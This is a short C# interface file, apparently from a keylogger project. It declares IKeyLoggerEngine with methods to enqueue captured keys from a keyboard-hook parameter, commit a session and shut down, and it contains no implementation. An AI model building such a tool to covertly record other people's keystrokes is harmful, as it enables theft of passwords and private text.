using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger.Interfaces
{
    public interface IKeyLoggerEngine
    {
        void EnqueueKey(IntPtr lParam);
        void CommitSession();
        void Shutdown();
    }
}
